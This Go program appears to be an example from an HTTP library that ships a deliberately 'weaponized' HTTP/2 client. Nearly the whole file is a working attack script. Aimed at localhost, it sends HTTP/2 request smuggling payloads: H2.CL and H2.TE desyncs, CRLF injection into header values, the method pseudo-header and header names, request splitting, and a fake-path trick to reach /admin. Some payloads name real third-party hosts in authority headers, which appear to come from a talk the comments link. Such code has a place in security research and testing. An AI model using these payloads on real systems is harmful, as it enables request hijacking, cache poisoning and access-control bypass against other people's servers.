package main

import (
	"log"
	"net"
	"strings"

	"github.com/projectdiscovery/rawhttp/crypto/tls"
	"github.com/projectdiscovery/rawhttp/example/httpclient"

	// normal
	// "net/http"
	// "golang.org/x/net/http2"
	// weaponized
	"github.com/projectdiscovery/rawhttp/net/http"
	"github.com/projectdiscovery/rawhttp/net/http2"
)

func main() {
	log.SetFlags(0)
	client := http.Client{
		Transport: &http2.Transport{
			AllowHTTP: true,
			DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
				return net.Dial(network, addr)
			},
		},
	}

	log.Println("[*] Malformed Header")
	req, err := http.NewRequest("GET", "http://localhost:8000", nil)
	if err != nil {
		log.Fatal(err)
	}
	// some malformed header
	req.Header.Add("TeSt   ", "test")
	req.Header["Test"] = []string{"test"}

	_, err = httpclient.SendAndDump(&client, req)
	if err != nil {
		log.Printf("[Client] error: %s\n", err)
	}

	log.Println("[*] H2.CL desync")
	// https://youtu.be/gAnDUoq1NzQ?t=672 - H2.CL desync
	payload := "abcdGET /n HTTP/1.1\r\nHost: 02.rs?localhost\r\nFoo: bar"
	req1, err := http.NewRequest(http.MethodPost, "http://localhost:8000/n", strings.NewReader(payload))
	if err != nil {
		log.Fatal(err)
	}
	req1.Header.Add(":content-length", "4")
	req1.AutomaticContentLength = false
	req1.Unsafe = true
	_, err = httpclient.SendAndDump(&client, req1)
	if err != nil {
		log.Printf("[Client] error: %s\n", err)
	}

	log.Println("[*] H2.TE desync")
	// https://youtu.be/gAnDUoq1NzQ?t=672 - H2.TE desync
	payload = "0\r\n\r\n\r\nGET /oops HTTP/1.1\r\nHost: pares.net\r\nContent-Length: 10\r\n\r\n\r\nX="
	req1, err = http.NewRequest(http.MethodPost, "http://localhost:8000/identify/XUI", strings.NewReader(payload))
	if err != nil {
		log.Fatal(err)
	}
	req1.Header[":authority"] = []string{"id.b2b.oath.com"}
	req1.Header["transfer-encoding"] = []string{"chunked"}
	req1.AutomaticContentLength = false
	req1.AutomaticHostHeader = false
	req1.AutomaticUserAgent = false
	req1.AutomaticAcceptEndocing = false
	req1.AutomaticScheme = false
	req1.Unsafe = true
	_, err = httpclient.SendAndDump(&client, req1)
	if err != nil {
		log.Printf("[Client] error: %s\n", err)
	}

	log.Println("[*] H2.TE via request header injection")
	// https://youtu.be/gAnDUoq1NzQ?t=992 - H2.TE via request header injection
	payload = "0\r\n\r\nGET / HTTP/1.1\r\nHost: evil-netlify-domain\r\nContent-Length: 5\r\n\r\nx="
	req1, err = http.NewRequest(http.MethodPost, "http://localhost:8000/", strings.NewReader(payload))
	if err != nil {
		log.Fatal(err)
	}
	req1.Header[":authority"] = []string{"start.mozilla.org"}
	req1.Header["foo"] = []string{"b\r\n"}
	req1.Header["transfer-encoding"] = []string{"chunked"}
	req1.AutomaticContentLength = false
	req1.AutomaticHostHeader = false
	req1.AutomaticUserAgent = false
	req1.AutomaticAcceptEndocing = false
	req1.AutomaticScheme = false
	req1.Unsafe = true
	_, err = httpclient.SendAndDump(&client, req)
	if err != nil {
		log.Printf("[Client] error: %s\n", err)
	}

	log.Println("[*] H2.TE via request splitting")
	// https://youtu.be/gAnDUoq1NzQ?t=1135 - H2.X via request splitting
	req1, err = http.NewRequest(http.MethodGet, "http://localhost:8000/", nil)
	if err != nil {
		log.Fatal(err)
	}
	req1.Header[":authority"] = []string{"eco.atlassian.net"}
	req1.Header["foo"] = []string{"bar\r\nHost: eco.atlassian.net\r\n\r\nGET /robots.txt HTTP/1.1\r\nX-Ignore: x"}
	req1.AutomaticContentLength = false
	req1.AutomaticHostHeader = false
	req1.AutomaticUserAgent = false
	req1.AutomaticAcceptEndocing = false
	req1.AutomaticScheme = false
	req1.Unsafe = true
	_, err = httpclient.SendAndDump(&client, req1)
	if err != nil {
		log.Printf("[Client] error: %s\n", err)
	}

	log.Println("[*] H2.TE via request line injection")
	// https://youtu.be/gAnDUoq1NzQ?t=1261 - H2.TE via request line injection
	req1, err = http.NewRequest(http.MethodGet, "http://localhost:8000/ignored", nil)
	if err != nil {
		log.Fatal(err)
	}
	req1.Header[":method"] = []string{"GET / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nx: x"}
	req1.AutomaticContentLength = false
	req1.AutomaticHostHeader = false
	req1.AutomaticUserAgent = false
	req1.AutomaticAcceptEndocing = false
	req1.AutomaticScheme = false
	req1.AutomaticMethod = false
	req1.Unsafe = true
	_, err = httpclient.SendAndDump(&client, req1)
	if err != nil {
		log.Printf("[Client] error: %s\n", err)
	}

	log.Println("[*] Header name splitting")
	// https://youtu.be/gAnDUoq1NzQ?t=2092 - Header name splitting
	req1, err = http.NewRequest(http.MethodPost, "http://localhost:8000/", nil)
	if err != nil {
		log.Fatal(err)
	}
	req1.Header[":method"] = []string{"POST"}
	req1.Header[":authority"] = []string{"redacted.net"}
	req1.Header["transfer-encoding: chunked"] = []string{""}
	req1.Header["host: pares.net"] = []string{"443"}
	req1.AutomaticContentLength = false
	req1.AutomaticHostHeader = false
	req1.AutomaticUserAgent = false
	req1.AutomaticAcceptEndocing = false
	req1.AutomaticScheme = false
	req1.AutomaticMethod = false
	req1.Unsafe = true
	_, err = httpclient.SendAndDump(&client, req1)
	if err != nil {
		log.Printf("[Client] error: %s\n", err)
	}

	log.Println("[*] Fake path")
	// https://youtu.be/gAnDUoq1NzQ?t=2092 - fake path
	req1, err = http.NewRequest(http.MethodPost, "http://localhost:8000/", nil)
	if err != nil {
		log.Fatal(err)
	}
	req1.Header[":method"] = []string{"GET /admin HTTP/1.1"}
	req1.Header[":path"] = []string{"/fakepath"}
	req1.Header[":authority"] = []string{"pares.net"}
	req1.AutomaticContentLength = false
	req1.AutomaticHostHeader = false
	req1.AutomaticUserAgent = false
	req1.AutomaticAcceptEndocing = false
	req1.AutomaticScheme = false
	req1.AutomaticMethod = false
	req1.AutomaticPath = false
	req1.Unsafe = true
	_, err = httpclient.SendAndDump(&client, req1)
	if err != nil {
		log.Printf("[Client] error: %s\n", err)
	}
}
